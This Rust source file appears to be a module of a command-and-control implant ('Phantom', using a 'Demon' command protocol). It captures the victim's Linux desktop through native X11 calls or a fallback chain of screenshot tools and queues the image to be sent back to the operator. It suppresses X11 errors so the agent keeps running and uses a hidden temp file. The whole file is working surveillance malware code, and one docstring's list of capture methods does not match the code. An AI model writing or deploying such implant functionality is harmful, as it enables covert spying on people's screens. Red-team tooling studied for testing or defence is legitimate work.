//! `CommandScreenshot` (ID 2510): Linux desktop capture.

use std::fs;
use std::process::Stdio;

use red_cell_common::demon::DemonCommand;
use tokio::process::Command;

use crate::error::PhantomError;

use super::PhantomState;
use super::encode::*;
use super::types::PendingCallback;

/// Handle `CommandScreenshot` (ID 2510): capture the Linux desktop.
///
/// Tries several capture methods in order of preference:
/// 1. `import -window root png:-` (ImageMagick)
/// 2. `scrot -o -` (scrot)
/// 3. `gnome-screenshot -f <tmpfile>` (GNOME)
/// 4. `xwd -root -silent` piped through `convert xwd:- png:-`
///
/// On success, sends a [`PendingCallback::Structured`] containing
/// `[success:u32=1][image_bytes:len-prefixed]`.  On failure, sends
/// `[success:u32=0]`.
pub(super) async fn execute_screenshot(
    request_id: u32,
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    match capture_screenshot().await {
        Ok(image_bytes) => {
            let mut payload = encode_u32(1); // success = TRUE
            payload.extend_from_slice(&encode_bytes(&image_bytes)?);
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                request_id,
                payload,
            });
        }
        Err(error) => {
            tracing::warn!(%error, "screenshot capture failed");
            let payload = encode_u32(0); // success = FALSE
            state.queue_callback(PendingCallback::Structured {
                command_id: u32::from(DemonCommand::CommandScreenshot),
                request_id,
                payload,
            });
        }
    }

    Ok(())
}

/// Attempt to capture a screenshot using available Linux tools.
///
/// Tries methods in priority order:
/// 1. Native X11 via `XOpenDisplay` + `XGetImage` (no subprocess, fastest)
/// 2. `scrot -o -` (X11 subprocess)
/// 3. `import -window root png:-` (ImageMagick, X11 subprocess)
/// 4. `grim -` (Wayland)
/// 5. `gnome-screenshot -f <tmpfile>` (last resort, GNOME Wayland/X11)
///
/// Returns the raw PNG image bytes on success.
async fn capture_screenshot() -> Result<Vec<u8>, PhantomError> {
    // Method 1: native X11 (sync FFI — run in blocking thread to avoid stalling executor)
    let x11_result = tokio::task::spawn_blocking(capture_x11_native)
        .await
        .unwrap_or_else(|e| Err(PhantomError::Screenshot(format!("spawn_blocking error: {e}"))));
    if let Ok(bytes) = x11_result {
        tracing::debug!("screenshot captured via native X11");
        return Ok(bytes);
    }

    // Method 2: scrot (X11 subprocess)
    if let Ok(output) = Command::new("scrot")
        .args(["-o", "-"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() && !output.stdout.is_empty() {
            tracing::debug!("screenshot captured via scrot");
            return Ok(output.stdout);
        }
    }

    // Method 3: import (ImageMagick, X11 subprocess)
    if let Ok(output) = Command::new("import")
        .args(["-window", "root", "png:-"])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() && !output.stdout.is_empty() {
            tracing::debug!("screenshot captured via import (ImageMagick)");
            return Ok(output.stdout);
        }
    }

    // Method 4: grim (Wayland native)
    if let Ok(output) =
        Command::new("grim").arg("-").stdout(Stdio::piped()).stderr(Stdio::null()).output().await
    {
        if output.status.success() && !output.stdout.is_empty() {
            tracing::debug!("screenshot captured via grim (Wayland)");
            return Ok(output.stdout);
        }
    }

    // Method 5: gnome-screenshot to a temp file (GNOME, works on both X11 and Wayland)
    let tmp_path = "/tmp/.phantom_screenshot.png";
    if let Ok(output) = Command::new("gnome-screenshot")
        .args(["-f", tmp_path])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output()
        .await
    {
        if output.status.success() {
            if let Ok(data) = fs::read(tmp_path) {
                let _ = fs::remove_file(tmp_path);
                if !data.is_empty() {
                    tracing::debug!("screenshot captured via gnome-screenshot");
                    return Ok(data);
                }
            }
        }
    }
    let _ = fs::remove_file(tmp_path);

    Err(PhantomError::Screenshot(
        "no screenshot tool available (tried native X11, scrot, import, grim, gnome-screenshot)"
            .to_owned(),
    ))
}

/// Global error flag set by [`x11_error_handler`].
///
/// Using an atomic avoids the need for a mutex and is safe because
/// `capture_x11_native` is always called from a single blocking thread and
/// calls `XSync` to drain the error queue before reading this flag.
static X11_ERROR_OCCURRED: std::sync::atomic::AtomicBool =
    std::sync::atomic::AtomicBool::new(false);

/// Custom X11 non-fatal error handler.
///
/// The default Xlib error handler calls `exit(1)` on any protocol error,
/// which would kill the agent process.  This handler stores the failure in
/// [`X11_ERROR_OCCURRED`] instead, allowing the caller to recover.
///
/// # Safety
/// Called by Xlib from within the `unsafe` block in [`capture_x11_native`].
unsafe extern "C" fn x11_error_handler(
    _display: *mut x11_dl::xlib::Display,
    _event: *mut x11_dl::xlib::XErrorEvent,
) -> libc::c_int {
    X11_ERROR_OCCURRED.store(true, std::sync::atomic::Ordering::Release);
    0
}

/// Capture the full desktop using native X11 (`XOpenDisplay` + `XGetImage`).
///
/// Dynamically loads `libX11.so` via `x11-dl` so the binary degrades gracefully
/// on systems without X11 headers or libraries installed.  Returns raw PNG bytes
/// on success.
///
/// A custom X11 error handler is installed for the duration of the call to
/// prevent the default handler from calling `exit(1)` on protocol errors
/// (e.g. `BadMatch` when the root window has no backing store).
///
/// # Errors
/// Returns [`PhantomError::Screenshot`] if the X11 library cannot be loaded,
/// `XOpenDisplay` fails (no `DISPLAY` set or Wayland-only session), or
/// `XGetImage` fails.
pub(super) fn capture_x11_native() -> Result<Vec<u8>, PhantomError> {
    use std::mem::MaybeUninit;
    use std::ptr;
    use std::sync::atomic::Ordering;
    use x11_dl::xlib::{self, Xlib, ZPixmap};

    // Attempt to dynamically load libX11.  Fails gracefully when the library is
    // absent (e.g. headless server or Wayland-only install without libX11).
    let xlib =
        Xlib::open().map_err(|e| PhantomError::Screenshot(format!("libX11 unavailable: {e}")))?;

    // SAFETY: all X11 objects are cleaned up before returning, and no pointers
    // escape this function.
    unsafe {
        let display = (xlib.XOpenDisplay)(ptr::null());
        if display.is_null() {
            return Err(PhantomError::Screenshot(
                "XOpenDisplay failed — DISPLAY not set or no X server running".to_owned(),
            ));
        }

        let screen = (xlib.XDefaultScreen)(display);
        let root = (xlib.XRootWindow)(display, screen);

        // Query root window geometry so we know the capture dimensions.
        let mut attrs = MaybeUninit::<xlib::XWindowAttributes>::uninit();
        (xlib.XGetWindowAttributes)(display, root, attrs.as_mut_ptr());
        let attrs = attrs.assume_init();
        let width = attrs.width as u32;
        let height = attrs.height as u32;

        if width == 0 || height == 0 {
            (xlib.XCloseDisplay)(display);
            return Err(PhantomError::Screenshot("root window has zero dimensions".to_owned()));
        }

        // Install our error handler so that protocol errors (e.g. BadMatch when
        // the root window has no backing store) set X11_ERROR_OCCURRED instead
        // of calling exit(1).
        X11_ERROR_OCCURRED.store(false, Ordering::Release);
        let prev_handler = (xlib.XSetErrorHandler)(Some(x11_error_handler));

        // Capture the full root window as a ZPixmap (raw pixel array, no padding).
        // AllPlanes = !0 selects all bit planes.
        let image = (xlib.XGetImage)(display, root, 0, 0, width, height, !0u64, ZPixmap);

        // Flush pending requests so the server delivers any asynchronous error
        // for the XGetImage call before we read the error flag.
        (xlib.XSync)(display, 0);

        // Restore the previous error handler.
        let _ = (xlib.XSetErrorHandler)(prev_handler);

        let error_occurred = X11_ERROR_OCCURRED.load(Ordering::Acquire);
        if image.is_null() || error_occurred {
            (xlib.XCloseDisplay)(display);
            return Err(PhantomError::Screenshot(
                "XGetImage failed (BadMatch or server error)".to_owned(),
            ));
        }

        let img = &*image;
        let bpp = img.bits_per_pixel as usize; // usually 32 on modern desktops
        let bpl = img.bytes_per_line as usize;
        let red_mask = img.red_mask;
        let green_mask = img.green_mask;
        let blue_mask = img.blue_mask;

        // Compute per-channel bit shifts from the masks.
        let red_shift = red_mask.trailing_zeros();
        let green_shift = green_mask.trailing_zeros();
        let blue_shift = blue_mask.trailing_zeros();

        let bytes_per_pixel = bpp / 8;
        let data_ptr = img.data as *const u8;
        let data_len = bpl * height as usize;
        let data = std::slice::from_raw_parts(data_ptr, data_len);

        // Convert XImage pixels to a packed RGB buffer.
        let mut rgb: Vec<u8> = Vec::with_capacity((width * height * 3) as usize);
        for row in 0..height as usize {
            let row_start = row * bpl;
            for col in 0..width as usize {
                let off = row_start + col * bytes_per_pixel;
                // Read the pixel as a native-endian value (handles 24-bit and 32-bit).
                let pixel: u64 = match bytes_per_pixel {
                    4 => {
                        u32::from_ne_bytes([data[off], data[off + 1], data[off + 2], data[off + 3]])
                            as u64
                    }
                    3 => {
                        data[off] as u64
                            | ((data[off + 1] as u64) << 8)
                            | ((data[off + 2] as u64) << 16)
                    }
                    _ => 0,
                };
                rgb.push(((pixel & red_mask) >> red_shift) as u8);
                rgb.push(((pixel & green_mask) >> green_shift) as u8);
                rgb.push(((pixel & blue_mask) >> blue_shift) as u8);
            }
        }

        // Free the XImage (this also frees img.data).
        (xlib.XDestroyImage)(image);
        (xlib.XCloseDisplay)(display);

        // Encode the RGB buffer to PNG.
        let mut png_bytes: Vec<u8> = Vec::new();
        let mut encoder = png::Encoder::new(&mut png_bytes, width, height);
        encoder.set_color(png::ColorType::Rgb);
        encoder.set_depth(png::BitDepth::Eight);
        let mut writer = encoder
            .write_header()
            .map_err(|e| PhantomError::Screenshot(format!("PNG header write failed: {e}")))?;
        writer
            .write_image_data(&rgb)
            .map_err(|e| PhantomError::Screenshot(format!("PNG data write failed: {e}")))?;
        drop(writer);

        Ok(png_bytes)
    }
}
